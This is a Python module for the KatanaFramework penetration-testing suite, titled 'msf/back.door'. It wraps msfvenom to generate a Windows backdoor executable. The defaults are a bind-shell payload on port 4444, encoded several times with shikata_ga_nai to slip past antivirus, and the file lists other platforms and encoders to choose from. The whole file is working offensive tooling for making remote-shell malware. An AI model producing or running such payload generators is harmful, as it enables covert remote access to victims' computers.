# This module requires katana framework 
# https://github.com/PowerScript/KatanaFramework

# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core import                  #
from core.KatanaFramework import *    #
# :-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-:-: #

# LIBRARIES  

# END LIBRARIES 

# INFORMATION MODULE
def init():
	init.Author             ="RedToor"
	init.Version            ="1.0"
	init.Description        ="Generator's payload with Metasploit"
	init.CodeName           ="msf/back.door"
	init.DateCreation       ="07/10/2016"      
	init.LastModification   ="07/01/2017"
	init.References         =None
	init.License            =KTF_LINCENSE
	init.var                ={}

	# DEFAULT OPTIONS MODULE
	init.options = {
		# NAME    VALUE                       RQ     DESCRIPTION
		'host'    :[LOCAL_IP                 ,True ,'Output path'],
		'port'    :["4444"                   ,True ,'Output path'],
		'output'  :["/home/backdoor.exe"     ,True ,'Output path'],
		'platform':["windows"                ,True ,'Plataform'],
		'payload' :["windows/shell/bind_tcp" ,True ,'Payload'],
		'encoder' :["x86/shikata_ga_nai"     ,True ,'Encoder type'],
		'arch'    :["x86"                    ,False,'Architecture'],
		'format'  :["exe"                    ,False,'Output format']
	}

	init.extra = {
		# NAME       VALUE                    RQ     DESCRIPTION
		'iterations' :["3"                   ,False ,'Output path'],
		'badchars'   :["\\x00\\xff"            ,False ,'Number to re-encode']
	}

	init.aux =  " \n PLATAFORMS {windows,linux,android,java,ruby,netware,unix,php,aix, \n"
	init.aux += " nodejs,netbsd,openbsd,freebsd,firefox,bsd,solaris,cisco,javascript}\n"
	init.aux += " \n ARCHUTECTURE {x86,x64}\n"
	init.aux += " \n ENCODERS\n"
	init.aux += " {cmd/generic_sh,cmd/ifs,cmd/printf_php_mq,generic/none,php/base64,x86/alpha_upper,\n"
	init.aux += " ppc/longxor,ppc/longxor_tag,sparc/longxor_tag,x64/xor,x86/alpha_mixed,x86/context_cpuid,\n"
	init.aux += " x86/avoid_underscore_tolower,x86/avoid_utf8_tolower,x86/bloxor,x86/call4_dword_xor,\n"
	init.aux += " x86/context_stat,x86/context_time,x86/countdown,x86/fnstenv_mov,x86/jmp_call_additive,\n"
	init.aux += " x86/nonalpha,x86/nonupper,x86/shikata_ga_nai,x86/single_static_bit,x86/unicode_mixed,x86/unicode_upper}\n"

	return init
# END INFORMATION MODULE

# CODE MODULE    ############################################################################################
def main(run):

	printk.inf("Checking if metasploit is installed: "+str(UTIL.CheckProjectInstalled("msfvenom")))
	if UTIL.CheckProjectInstalled("msfvenom"):
		printk.wait("Wait, msfvenom working...")
		secuence = "msfvenom"
		secuence += " -a "+init.var['arch']	
		secuence += " --platform "+init.var['platform']
		secuence += " -p "+init.var['payload']+" LHOST="+init.var['host']+" LPORT="+init.var['port']
		secuence += " -e "+init.var['encoder']
		secuence += " -i "+init.var['iterations']
		secuence += " -f "+init.var['format']
		secuence += " -o "+init.var['output']
		secuence += " -b '"+init.var['badchars']+"'"
		SYSTEM.Command_exe("Generating Payload\t\t\t",secuence,std=False)
		Space()
		
# END CODE MODULE ############################################################################################
